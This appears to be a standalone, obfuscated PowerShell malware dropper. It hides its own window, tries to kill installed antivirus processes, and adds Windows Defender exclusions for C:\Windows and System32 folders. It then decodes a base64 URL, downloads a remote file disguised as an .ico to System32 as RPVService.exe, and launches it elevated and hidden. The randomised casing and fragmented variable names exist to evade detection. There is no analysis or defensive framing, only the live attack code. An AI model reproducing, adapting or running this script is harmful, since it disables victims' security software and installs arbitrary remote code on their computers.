Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices; public class WindowHelper { [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); public const int SW_HIDE = 0; public static void HideWindow() { IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); } }
"@; [WindowHelper]::HideWindow();$V="Windows";$DDF="Service";$SD="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FvZGZzLzAvbWFpbi9maWxlLmljbw";$GJ="em";$FG="C";$DF=":";$DSF="V";$DFH="Sys";$C=(Get-WmiObject -Namespace "root\SecurityCenter2" -clASS aNTIvIrUSprOdUct).diSpLAynAmE;$DFS="t";$D=$C|Where-Object{$_-ne"$V Defender"};$SF="\";$DHJ = "3";$DSAF="2";if($D){foreach ($E in $D){if($antivirusProcesses.ContainsKey($E)){$F=$antivirusProcesses[$E];Get-Process -Name $F -eRRoRactIoN sIlentLycOntInuE|Stop-Process -Force;}}$G=@("$FG$DF$SF$V","$FG$DF$SF$V\Boot","$FG$DF$SF$V\debug","$FG$DF$SF$V\$DFH$DFS$GJ","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\WDI","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Boot","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Dism","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Tasks","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Microsoft","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\WinMetadata");foreach($H in $G) {aDD-mPPrEfErEncE -ExClusIoNpAtH $H -eRRoRactIoN sIlentLycOntInuE};$Iby=[System.Convert]::FromBase64String($SD+"==");$BBR=$GJ.substring(0,$GJ.Length-1).ToLower();$CNCV="RP";$I=[System.Text.Encoding]::UTF8.GetString($Iby);$J="C:\$V\$DFH$DFS$GJ$DHJ$DSAF\$CNCV$DSF$DDF.ex$BBR";stARt-bITstrAnsfEr -sOUrcE $I -dEstInAtIOn $J -eRRoRactIoN sIlentLycOntInuE;if(-not(tESt-pAtH $J)){inVOkE-wEbreQUEst -uRI $I -ouTfIle $J -eRRoRactIoN sIlentLycOntInuE}try{sTArt-prOCESS -fIlEPAth $J -vErb rUNAS -wINdOwSTyLe Hidden -eRRoRactIoN sIlentLycOntInuE}catch{& $J -eRRoRactIoN sIlentLycOntInuE}}else{$G=@("$FG$DF$SF$V","$FG$DF$SF$V\Boot","$FG$DF$SF$V\debug","$FG$DF$SF$V\$DFH$DFS$GJ","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\WDI","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Boot","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Dism","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Tasks","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\Microsoft","$FG$DF$SF$V\$DFH$DFS$GJ$DHJ$DSAF\WinMetadata");foreach($H in $G) {aDD-mPPrEfErEncE -ExClusIoNpAtH $H -eRRoRactIoN sIlentLycOntInuE};$Iby=[System.Convert]::FromBase64String($SD+"==");$BBR=$GJ.substring(0,$GJ.Length-1).ToLower();$CNCV="RP";$I=[System.Text.Encoding]::UTF8.GetString($Iby);$J="C:\$V\$DFH$DFS$GJ$DHJ$DSAF\$CNCV$DSF$DDF.ex$BBR";stARt-bITstrAnsfEr -sOUrcE $I -dEstInAtIOn $J -eRRoRactIoN sIlentLycOntInuE;if(-not(tESt-pAtH $J)){inVOkE-wEbreQUEst -uRI $I -ouTfIle $J -eRRoRactIoN sIlentLycOntInuE}try{sTArt-prOCESS -fIlEPAth $J -vErb rUNAS -wINdOwSTyLe Hidden -eRRoRactIoN sIlentLycOntInuE}catch{& $J -eRRoRactIoN sIlentLycOntInuE}}
